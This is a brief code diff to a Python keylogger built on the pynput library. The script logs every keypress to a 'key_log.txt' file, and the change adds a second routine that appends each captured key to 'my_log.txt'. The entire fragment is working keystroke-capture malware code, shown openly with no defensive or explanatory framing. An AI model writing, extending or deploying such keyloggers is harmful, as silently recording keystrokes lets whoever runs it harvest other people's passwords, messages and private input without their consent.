@@ -9,7 +9,8 @@ logging.basicConfig(filename=(log_Directory + "key_log.txt"),
 
 def on_press(key):
     logging.info(key)
+    with open('my_log.txt', 'a+') as f:
+        f.write(str(key))
 
 with Listener(on_press=on_press) as listener:
     listener.join()
-abcdefg
